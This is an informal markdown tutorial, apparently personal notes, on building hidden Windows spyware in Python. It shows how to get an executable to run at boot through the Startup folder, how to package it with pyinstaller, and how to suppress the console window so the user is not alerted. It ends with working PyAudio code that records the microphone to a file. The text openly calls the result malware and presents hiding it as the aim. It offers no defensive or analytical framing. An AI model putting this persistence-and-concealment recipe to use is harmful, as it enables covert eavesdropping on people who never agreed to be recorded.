# Auto-run

This will discuss windows executables

you can do windows+R the type shell:startup

It will open C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Anything in this folder will run at boot



# Create simple python exe

Real malware isn't written in python lol but let's run with this

```
pip install pyinstaller
pyinstaller yourfile.py -F --onefile
```

# Make exe hidden

There will be a brief cmd popup whenever your script runs, very suspicious, let's remove it. 

There are many tutorials and many different ways and will probably change in future windows versions. 

A simple one in this case is add `--noconsole` to pyinstaller. 

# Recording audio

```
pip install pyaudio
```


```python
import pyaudio
import wave

def record_audio(seconds, filename):
    p = pyaudio.PyAudio() 
    fs = 44100
    chunk = 1024
    stream = p.open(format=pyaudio.paInt16,channels=2,rate=fs,frames_per_buffer=chunk,input=True)
    frames = [] 
    for _ in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, 'wb')
    wf.setnchannels(2)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(fs)
    wf.writeframes(b''.join(frames))
    wf.close()

record_audio(seconds=10, filename="output.wav")
```
